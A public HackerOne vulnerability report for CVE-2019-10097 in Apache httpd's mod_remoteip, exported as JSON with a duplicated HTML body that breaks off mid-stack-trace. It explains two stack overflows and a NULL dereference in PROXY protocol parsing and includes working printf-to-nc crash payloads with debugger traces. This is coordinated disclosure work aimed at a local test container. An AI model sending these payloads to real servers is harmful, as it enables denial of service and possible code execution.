{"id":674540,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NzQ1NDA=","url":"https://hackerone.com/reports/674540","title":"mod_remoteip stack buffer overflow and NULL pointer dereference","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-08-15T14:42:13.816Z","submitted_at":"2019-08-15T14:42:13.816Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ccppuu","url":"/ccppuu","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/J7su3PHKVo6f7cGgVkFJCTjq/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":26,"url":"https://hackerone.com/ibb-apache","handle":"ibb-apache","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/026/1019d58a547964cedd75cda5809332316a7e381c_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/026/1019d58a547964cedd75cda5809332316a7e381c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Apache httpd (IBB)","twitter_handle":"","website":"http://apache.org/security","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2019-10097"],"singular_disclosure_disabled":false,"disclosed_at":"2019-11-07T20:21:12.527Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-10-08T20:21:09.805Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Versions Affected:\nhttpd 2.4.32 to 2.4.39\n\nSummary:\nWhen mod_remoteip was configured to use a trusted intermediary proxy server using the \"PROXY\" protocol, a specially crafted PROXY v1 or PROXY v2 header could trigger a stack buffer overflow or NULL pointer deference. \n\nThis was assigned CVE-2019-10097 and triaged by the Apache security team as a \"Moderate\" severity vulnerability, fixed in Apache 2.4.41: https://www.openwall.com/lists/oss-security/2019/08/15/5\n\nThe HTTPD maintainers and I collaborated on the fix: http://svn.apache.org/viewvc?view=revision\u0026revision=1864526\n\nOriginal report to Apache security team (with reproductions) follows:\n--------------------------------------------------------------------------------------------------------------------------------\n\nApache httpd 2.4.31+ and newer when configured with `mod_remoteip` and\n`RemoteIPProxyProtocol On` is affected by multiple vulnerabilities. The\nvulnerabilities can be triggered remotely with malicious PROXY protocol request\ninput (both PROXY protocol versions 1 and 2).\n\nThe vulnerabilities identified in this report:\n\n* HIGH: Stack overflow from unsafe memcpy handling PROXY v1/v2 messages\n* HIGH: Stack overflow from unsafe strcpy handling PROXY v1 messages\n* MED: Denial of service from null pointer dereference handling PROXY v2\n  messages\n\nThese vulnerabilities also apply to the 3rd party `mod_proxy_protocol` module\nfrom which the core HTTPD `mod_remoteip` module was derived.\n\n# Reported by\n\nDaniel McCarney - cpu@letsencrypt.org\nLet's Encrypt / Internet Security Research Group (ISRG)\n\n# Background\n\nIn a multi-tier architecture the server that terminates a client connection may\nin turn initiate a new request to another server. For access control and logging\nit's beneficial for the first server to be able to pass along information about\nthe original client request (e.g. source IP address and port) to the other\nserver(s).\n\nAs a replacement for ad-hoc HTTP headers (e.g. `X-Forwarded-For`) the HAProxy\nproject specified a protocol (confusingly) called PROXY[0]. There are two\nversions specified:\n\n* PROXY version 1 - a simple ASCII based protocol.\n* PROXY version 2 - a more efficient binary protocol.\n\nThe Apache HTTPD project added support to the core `mod_remoteip` module[1] for\nPROXY version 1 and version 2 in HTTPD version 2.4.31. It can be enabled\nserver-wide or per virtual host using the `RemoteIPProxyProtocol on`\nconfiguration. Previously Apache HTTPD servers could add support for the PROXY\nprotocol with a 3rd party `mod_proxy_protocol`[2] module.\n\n# Vulnerability Detail\n\nFunction names referenced in this section may be found in the source file\n`modules/metadata/mod_remoteip.c`[3].\n\nTo aid in reproduction I've created a simple Dockerfile available here:\n\n  https://gist.github.com/cpu/60365c1451bd531f79f5364f44f18f5c\n\nAnd modified a stock `httpd.conf` to enable PROXY protocol by adding:\n\n1. `RemoteIPProxyProtocol On`\n2. `LoadModule remoteip_module modules/mod_remoteip.so`\n\nThe `httpd.conf` is available here:\n\n  https://gist.github.com/cpu/a6b0edaacd9fdf8d978886d0a325d975\n\nAfter downloading both simply run:\n\n```\ndocker build -t test-apache2 .\ndocker run -dit --name test-apache2-app -p 6666:80 test-apache2\n```\n\nHTTPD logs are accessible with:\n\n```\ndocker logs -f test-apache2-app\n```\n\nThe provided proof of concept vulnerability triggers are now ready to be\ndelivered to `localhost:6666`.\n\n## Stack overflow from unsafe memcpy handling PROXY v1 and V2 messages\n\nIn the `remoteip_input_filter` function the data read from the bucket brigade\ncarrying the attacker input (pointed to by `ptr`, of len `len`) is copied into\nthe `ctx-\u003eheader` structure, at an offset of `ctx-\u003ercvd` bytes using `memcpy`:\n\n```\nmemcpy(ctx-\u003eheader + ctx-\u003ercvd, ptr, len);\n```\n\nThere is no enforcement that the destination buffer is sized appropriately so\nwhen `len` is larger than `sizeof(ctx-\u003eheader)` a classic buffer overflow\noccurs.\n\n### Example reproduction\n\nAny PROXY v1 request with a \"PROXY \" prefix, a trailing `\\r\\n` and sufficient\nsize will trigger this vulnerability.\n\n```\nprintf \"PROXY aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\r\\n\" | nc localhost 6666\n```\n\nStack trace:\n```\nThread 3 \"httpd\" received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0x7ffff2e0b700 (LWP 17165)]\napr_brigade_destroy (b=0x6161616161616161) at buckets/apr_brigade.c:52\n52          apr_pool_cleanup_kill(b-\u003ep, b, brigade_cleanup);\n```\n\nAny valid PROXY v2 request (e.g. supported version, cmd, protocol and address family) and sufficient size will also trigger this vulnerability.\n\n```\nprintf \"\\x0D\\x0A\\x0D\\x0A\\x00\\x0D\\x0A\\x51\\x55\\x49\\x54\\x0A\\x21\\x32\\x08\\x6f\\x6faaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\" | nc localhost 6666\n```\n\nStack trace:\n```\nThread 3 \"httpd\" received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0x7ffff2e0b700 (LWP 17197)]\napr_brigade_destroy (b=0x6161616161616161) at buckets/apr_brigade.c:52\n52          apr_pool_cleanup_kill(b-\u003ep, b, brigade_cleanup);\n```\n\n## Stack overflow from unsafe strcpy handling PROXY v1 messages\n\n### Detail\n\nAfter the `remoteip_input_filter` function has determined that received input is\nPROXY v1 (with `remoteip_determine_version`) the raw PROXY header data context\nis passed to `remoteip_process_v1_handler` to handle decoding the human readable\nPROXY v1 message format.\n\nA static sized buffer named `buf` is initialized on the stack with a capacity of\n`sizeof(hdr-\u003ev1.line)`, resulting in a 108 byte buffer. Later, a `strcpy` is\nused to copy from `hdr-\u003ev1.line` to `buf`. There is no check that the `strlen`\nof `hdr-\u003ev1.line` is less than the capacity of `buf`, resulting in a trivial\nbuffer overflow.\n\n```\n/* parse in separate buffer so have the original for error messages */\nstrcpy(buf, hdr-\u003ev1.line);\n```\n\n### Example reproduction\n\nAny PROXY v1 request with a \"PROXY \" prefix, a trailing `\\r\\n` and sufficient\nsize will trigger this vulnerabiltiy. Using requests that are too large will end\nup triggering the more general `memcpy` vulnerability discussed previously.\n\n```\nprintf \"PROXY aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\r\\n\" | nc localhost 6666\n```\n\nStacktrace:\n```\n*** buffer overflow detected ***: /usr/local/apache2/bin/httpd terminated\n======= Backtrace: =========\n/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7ffff71927e5]\n/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x5c)[0x7ffff723415c]\n/lib/x86_64-linux-gnu/libc.so.6(+0x117160)[0x7ffff7232160]\n/lib/x86_64-linux-gnu/libc.so.6(+0x1164b2)[0x7ffff72314b2]\n/usr/local/apache2/modules/mod_remoteip.so(+0x39e3)[0x7ffff486e9e3]\n/usr/local/apache2/bin/httpd(ap_rgetline_core+0xfa)[0x43843a]\n/usr/local/apache2/bin/httpd(ap_read_request+0x2a6)[0x43b1e6]\n/usr/local/apache2/bin/httpd[0x464b6d]\n/usr/local/apache2/bin/httpd(ap_run_process_connection+0x40)[0x45beb0]\n/usr/local/apache2/bin/httpd[0x470455]\n/usr/local/apache2/bin/httpd[0x471428]\n/lib/x86_64-linux-gnu/libpthread.so.0(+0x76ba)[0x7ffff74ec6ba]\n/lib/x86_64-linux-gnu/libc.so.6(clone+0x6d)[0x7ffff722241d]\n```\n\n## Denial of service from null pointer dereference handling PROXY v2\n\nIn the `remoteip_input_filter` function it's assumed that when control flow\nreaches L1173 that the `done` variable is true and so the `conn_conf` has been\npopulated with the true `client_ip` and `client_addr` by the PROXY messages that\nwere processed to reach the done state. The `conn_conf-\u003eclient_addr` field is\nthen dereferenced to log `conn_conf-\u003eclient_addr-\u003eport`.\n\n```\nap_log_cerror(APLOG_MARK, APLOG_DEBUG, 0, f-\u003ec, APLOGNO(03511)\n              \"RemoteIPProxyProtocol: received valid PROXY header: %s:%hu\",\n              conn_conf-\u003eclient_ip, conn_conf-\u003eclient_addr-\u003eport);\n```\n\nUnfortunately there is a logic error in this assumption. The\n`remoteip_process_v2_header` function returns `HDR_DONE`, triggering `done = 1`\nin two conditions where the `conn_conf-\u003eclient_addr` remains null, triggering\na null pointer dereference when `conn_conf-\u003eclient_addr-\u003eport` is evaluated,\ncausing the worker thread to segfault.\n\nThe first condition this can occur is when the `hdr-\u003ev2.fam` indicating the\naddress family and protocol is unsupported:\n\n```\n    default:\n        /* unsupported protocol, keep local connection address */\n        return HDR_DONE;\n```\n\nThe other condition this can occur is when the `hdr-\u003ev2.ver_cmd`'s lower order\nbits are 0x00, indicating it is a LOCAL command.\n\n```\n   case 0x00: /* LOCAL command */\n       /* keep local connection address for LOCAL */\n       return HDR_DONE;\n```\n\nThe comments in the LOCAL command case potentially indicate that there was an\nassumption that the addresses were pre-populated and so HDR_DONE could be\nreturned without error. I believe this code/assumption were adopted from the\nHAProxy PROXY protocol example code at the end of the specification document[1]\nwhere the same `case 0x00` logic and comment can be found. In this example code\nhowever the `sockaddr_storage` for `from` and `to` are said to have been\n\"already filled by accept()\" and \"getsockname()\".\n\n### Example reproduction\n\nThis bug can be triggered with a valid PROXY v2 message using the LOCAL command:\n\n```\nprintf \"\\x0D\\x0A\\x0D\\x0A\\x00\\x0D\\x0A\\x51\\x55\\x49\\x54\\x0A\\x20\\x11\\x00\\x00\" | nc localhost 6666\n```\n\nStack trace:\n```\nThread 3 \"httpd\" received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0x7ffff2e0b700 (LWP 17395)]\n0x00007ffff486ebad in remoteip_input_filter (f=0x7fffec037690, bb_out=0x7fffdc003e58, mode=AP_MODE_GETLINE,.\n    block=APR_BLOCK_READ, readbytes=0) at mod_remoteip.c:1248\n    1248        ap_log_cerror(APLOG_MARK, APLOG_DEBUG, 0, f-\u003ec, APLOGNO(03511)\n\n```\n\nIt can also be triggered with a valid PROXY v2 message using the PROXY command\nand an unsupported address family/protocol:\n\n```\nprintf \"\\x0D\\x0A\\x0D\\x0A\\x00\\x0D\\x0A\\x51\\x55\\x49\\x54\\x0A\\x21\\x00\\x00\\x00\" | nc localhost 6666\n```\n\nStack trace:\n```\nThread 3 \"httpd\" received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0x7ffff2e0b700 (LWP 17437)]\n0x00007ffff486ebad in remoteip_input_filter (f=0x7fffec037690, bb_out=0x7fffdc003e58, mode=AP_MODE_GETLINE,.\n    block=APR_BLOCK_READ, readbytes=0) at mod_remoteip.c:1248\n    1248        ap_log_cerror(APLOG_MARK, APLOG_DEBUG, 0, f-\u003ec, APLOGNO(03511)\n```\n\n# Mitigations\n\nThe Apache `mod_remoteip` docs[1] strongly encourages care with what\nintermediate hosts should be trusted to provide `mod_remoteip` inputs:\n\n\u003e It is critical to only enable this behavior from intermediate hosts (proxies,\n\u003e etc) which are trusted by this server, since it is trivial for the remote\n\u003e useragent to impersonate another useragent.\n\nAdministrators that restrict the hosts that can send requests to the\nVirtualHost/Server with `RemoteIPPRoxyProtocol on` (e.g. through external\nfirewall policy/network controls) will restrict their exposure\nto these vulnerabilities.\n\nUnfortunately unlike the `RemoteIPHeader` directives it is *not* possible to\nconfigure `RemoteIPProxyProtocol on` and whitelist intermediate IP addresses\n(e.g. like `RemoteIPInternalProxyList`) within the Apache configuration. Thus\nadministrators must take action above and beyond their Apache configuration to\nuse this module safely and mitigate the reported vulnerabilities.\n\n# Applicability to mod_proxy_protocol\n\nThe core Apache project `mod_remoteip` module's PROXY support was originally\nadopted from a 3rd party module, `mod_proxy_protocol`[2]. All of the\nvulnerabilities identified in this report are from code shared with the original\n`mod_proxy_protocol` module. Users of this module with other HTTPD versions are\nequally affected by these vulnerabilities.\n\n# References\n\n[0] https://httpd.apache.org/docs/2.4/mod/mod_remoteip.html\n[1] https://www.haproxy.org/download/1.8/doc/proxy-protocol.txt\n[2] https://github.com/roadrunner2/mod-proxy-protocol\n[3] https://github.com/apache/httpd/blob/8cfc6007670cf4bcc7129c197dda456e0d5de102/modules/metadata/mod_remoteip.c\n\n## Impact\n\nThe classic stack overflows can lead to memory corruption and the potential for remote code execution.\n\nTypically the PROXY protocol is used between security contexts: e.g. a front-end web server in a DMZ terminates HTTP/HTTPS and uses the PROXY protocol when forwarding the request to an application server in a different security context with firewall rules protecting access except from the front-end web server. Abusing the PROXY protocol would allow an attacker who has compromised the front-end web server to pivot through code execution on the application server via crafted PROXY request.","vulnerability_information_html":"\u003cp\u003eVersions Affected:\u003cbr\u003e\nhttpd 2.4.32 to 2.4.39\u003c/p\u003e\n\n\u003cp\u003eSummary:\u003cbr\u003e\nWhen mod_remoteip was configured to use a trusted intermediary proxy server using the \u0026quot;PROXY\u0026quot; protocol, a specially crafted PROXY v1 or PROXY v2 header could trigger a stack buffer overflow or NULL pointer deference. \u003c/p\u003e\n\n\u003cp\u003eThis was assigned CVE-2019-10097 and triaged by the Apache security team as a \u0026quot;Moderate\u0026quot; severity vulnerability, fixed in Apache 2.4.41: \u003ca title=\"https://www.openwall.com/lists/oss-security/2019/08/15/5\" href=\"/redirect?url=https%3A%2F%2Fwww.openwall.com%2Flists%2Foss-security%2F2019%2F08%2F15%2F5\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.openwall.com/lists/oss-security/2019/08/15/5\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe HTTPD maintainers and I collaborated on the fix: \u003ca title=\"http://svn.apache.org/viewvc?view=revision\u0026amp;revision=1864526\" href=\"/redirect?url=http%3A%2F%2Fsvn.apache.org%2Fviewvc%3Fview%3Drevision%26revision%3D1864526\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://svn.apache.org/viewvc?view=revision\u0026amp;revision=1864526\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"original-report-to-apache-security-team-with-reproductions-follows\"\u003eOriginal report to Apache security team (with reproductions) follows:\u003c/h2\u003e\n\n\u003cp\u003eApache httpd 2.4.31+ and newer when configured with \u003ccode\u003emod_remoteip\u003c/code\u003e and\u003cbr\u003e\n\u003ccode\u003eRemoteIPProxyProtocol On\u003c/code\u003e is affected by multiple vulnerabilities. The\u003cbr\u003e\nvulnerabilities can be triggered remotely with malicious PROXY protocol request\u003cbr\u003e\ninput (both PROXY protocol versions 1 and 2).\u003c/p\u003e\n\n\u003cp\u003eThe vulnerabilities identified in this report:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eHIGH: Stack overflow from unsafe memcpy handling PROXY v1/v2 messages\u003c/li\u003e\n\u003cli\u003eHIGH: Stack overflow from unsafe strcpy handling PROXY v1 messages\u003c/li\u003e\n\u003cli\u003eMED: Denial of service from null pointer dereference handling PROXY v2\nmessages\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThese vulnerabilities also apply to the 3rd party \u003ccode\u003emod_proxy_protocol\u003c/code\u003e module\u003cbr\u003e\nfrom which the core HTTPD \u003ccode\u003emod_remoteip\u003c/code\u003e module was derived.\u003c/p\u003e\n\n\u003ch1 id=\"reported-by\"\u003eReported by\u003c/h1\u003e\n\n\u003cp\u003eDaniel McCarney - \u003ca title=\"cpu@letsencrypt.org\" href=\"mailto:cpu@letsencrypt.org\" rel=\"nofollow noopener noreferrer\"\u003ecpu@letsencrypt.org\u003c/a\u003e\u003cbr\u003e\nLet\u0026#39;s Encrypt / Internet Security Research Group (ISRG)\u003c/p\u003e\n\n\u003ch1 id=\"background\"\u003eBackground\u003c/h1\u003e\n\n\u003cp\u003eIn a multi-tier architecture the server that terminates a client connection may\u003cbr\u003e\nin turn initiate a new request to another server. For access control and logging\u003cbr\u003e\nit\u0026#39;s beneficial for the first server to be able to pass along information about\u003cbr\u003e\nthe original client request (e.g. source IP address and port) to the other\u003cbr\u003e\nserver(s).\u003c/p\u003e\n\n\u003cp\u003eAs a replacement for ad-hoc HTTP headers (e.g. \u003ccode\u003eX-Forwarded-For\u003c/code\u003e) the HAProxy\u003cbr\u003e\nproject specified a protocol (confusingly) called PROXY[0]. There are two\u003cbr\u003e\nversions specified:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003ePROXY version 1 - a simple ASCII based protocol.\u003c/li\u003e\n\u003cli\u003ePROXY version 2 - a more efficient binary protocol.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe Apache HTTPD project added support to the core \u003ccode\u003emod_remoteip\u003c/code\u003e module[1] for\u003cbr\u003e\nPROXY version 1 and version 2 in HTTPD version 2.4.31. It can be enabled\u003cbr\u003e\nserver-wide or per virtual host using the \u003ccode\u003eRemoteIPProxyProtocol on\u003c/code\u003e\u003cbr\u003e\nconfiguration. Previously Apache HTTPD servers could add support for the PROXY\u003cbr\u003e\nprotocol with a 3rd party \u003ccode\u003emod_proxy_protocol\u003c/code\u003e[2] module.\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability-detail\"\u003eVulnerability Detail\u003c/h1\u003e\n\n\u003cp\u003eFunction names referenced in this section may be found in the source file\u003cbr\u003e\n\u003ccode\u003emodules/metadata/mod_remoteip.c\u003c/code\u003e[3].\u003c/p\u003e\n\n\u003cp\u003eTo aid in reproduction I\u0026#39;ve created a simple Dockerfile available here:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://gist.github.com/cpu/60365c1451bd531f79f5364f44f18f5c\" href=\"/redirect?url=https%3A%2F%2Fgist.github.com%2Fcpu%2F60365c1451bd531f79f5364f44f18f5c\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gist.github.com/cpu/60365c1451bd531f79f5364f44f18f5c\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eAnd modified a stock \u003ccode\u003ehttpd.conf\u003c/code\u003e to enable PROXY protocol by adding:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003eRemoteIPProxyProtocol On\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eLoadModule remoteip_module modules/mod_remoteip.so\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eThe \u003ccode\u003ehttpd.conf\u003c/code\u003e is available here:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://gist.github.com/cpu/a6b0edaacd9fdf8d978886d0a325d975\" href=\"/redirect?url=https%3A%2F%2Fgist.github.com%2Fcpu%2Fa6b0edaacd9fdf8d978886d0a325d975\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gist.github.com/cpu/a6b0edaacd9fdf8d978886d0a325d975\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eAfter downloading both simply run:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003edocker build -t test-apache2 .\ndocker run -dit --name test-apache2-app -p 6666:80 test-apache2\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHTTPD logs are accessible with:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003edocker logs -f test-apache2-app\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe provided proof of concept vulnerability triggers are now ready to be\u003cbr\u003e\ndelivered to \u003ccode\u003elocalhost:6666\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch2 id=\"stack-overflow-from-unsafe-memcpy-handling-proxy-v1-and-v2-messages\"\u003eStack overflow from unsafe memcpy handling PROXY v1 and V2 messages\u003c/h2\u003e\n\n\u003cp\u003eIn the \u003ccode\u003eremoteip_input_filter\u003c/code\u003e function the data read from the bucket brigade\u003cbr\u003e\ncarrying the attacker input (pointed to by \u003ccode\u003eptr\u003c/code\u003e, of len \u003ccode\u003elen\u003c/code\u003e) is copied into\u003cbr\u003e\nthe \u003ccode\u003ectx-\u0026gt;header\u003c/code\u003e structure, at an offset of \u003ccode\u003ectx-\u0026gt;rcvd\u003c/code\u003e bytes using \u003ccode\u003ememcpy\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ememcpy(ctx-\u0026gt;header + ctx-\u0026gt;rcvd, ptr, len);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThere is no enforcement that the destination buffer is sized appropriately so\u003cbr\u003e\nwhen \u003ccode\u003elen\u003c/code\u003e is larger than \u003ccode\u003esizeof(ctx-\u0026gt;header)\u003c/code\u003e a classic buffer overflow\u003cbr\u003e\noccurs.\u003c/p\u003e\n\n\u003ch3 id=\"example-reproduction\"\u003eExample reproduction\u003c/h3\u003e\n\n\u003cp\u003eAny PROXY v1 request with a \u0026quot;PROXY \u0026quot; prefix, a trailing \u003ccode\u003e\\r\\n\u003c/code\u003e and sufficient\u003cbr\u003e\nsize will trigger this vulnerability.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eprintf \u0026quot;PROXY aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\r\\n\u0026quot; | nc localhost 6666\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eStack trace:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eThread 3 \u0026quot;httpd\u0026quot; received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0x7ffff2e0b700 (LWP 17165)]\napr_brigade_destroy (b=0x6161616161616161) at buckets/apr_brigade.c:52\n52          apr_pool_cleanup_kill(b-\u0026gt;p, b, brigade_cleanup);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAny valid PROXY v2 request (e.g. supported version, cmd, protocol and address family) and sufficient size will also trigger this vulnerability.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eprintf \u0026quot;\\x0D\\x0A\\x0D\\x0A\\x00\\x0D\\x0A\\x51\\x55\\x49\\x54\\x0A\\x21\\x32\\x08\\x6f\\x6faaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026quot; | nc localhost 6666\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eStack trace:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eThread 3 \u0026quot;httpd\u0026quot; received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0x7ffff2e0b700 (LWP 17197)]\napr_brigade_destroy (b=0x6161616161616161) at buckets/apr_brigade.c:52\n52          apr_pool_cleanup_kill(b-\u0026gt;p, b, brigade_cleanup);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"stack-overflow-from-unsafe-strcpy-handling-proxy-v1-messages\"\u003eStack overflow from unsafe strcpy handling PROXY v1 messages\u003c/h2\u003e\n\n\u003ch3 id=\"detail\"\u003eDetail\u003c/h3\u003e\n\n\u003cp\u003eAfter the \u003ccode\u003eremoteip_input_filter\u003c/code\u003e function has determined that received input is\u003cbr\u003e\nPROXY v1 (with \u003ccode\u003eremoteip_determine_version\u003c/code\u003e) the raw PROXY header data context\u003cbr\u003e\nis passed to \u003ccode\u003eremoteip_process_v1_handler\u003c/code\u003e to handle decoding the human readable\u003cbr\u003e\nPROXY v1 message format.\u003c/p\u003e\n\n\u003cp\u003eA static sized buffer named \u003ccode\u003ebuf\u003c/code\u003e is initialized on the stack with a capacity of\u003cbr\u003e\n\u003ccode\u003esizeof(hdr-\u0026gt;v1.line)\u003c/code\u003e, resulting in a 108 byte buffer. Later, a \u003ccode\u003estrcpy\u003c/code\u003e is\u003cbr\u003e\nused to copy from \u003ccode\u003ehdr-\u0026gt;v1.line\u003c/code\u003e to \u003ccode\u003ebuf\u003c/code\u003e. There is no check that the \u003ccode\u003estrlen\u003c/code\u003e\u003cbr\u003e\nof \u003ccode\u003ehdr-\u0026gt;v1.line\u003c/code\u003e is less than the capacity of \u003ccode\u003ebuf\u003c/code\u003e, resulting in a trivial\u003cbr\u003e\nbuffer overflow.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e/* parse in separate buffer so have the original for error messages */\nstrcpy(buf, hdr-\u0026gt;v1.line);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"example-reproduction\"\u003eExample reproduction\u003c/h3\u003e\n\n\u003cp\u003eAny PROXY v1 request with a \u0026quot;PROXY \u0026quot; prefix, a trailing \u003ccode\u003e\\r\\n\u003c/code\u003e and sufficient\u003cbr\u003e\nsize will trigger this vulnerabiltiy. Using requests that are too large will end\u003cbr\u003e\nup triggering the more general \u003ccode\u003ememcpy\u003c/code\u003e vulnerability discussed previously.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eprintf \u0026quot;PROXY aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\r\\n\u0026quot; | nc localhost 6666\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eStacktrace:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e*** buffer overflow detected ***: /usr/local/apache2/bin/httpd terminated\n======= 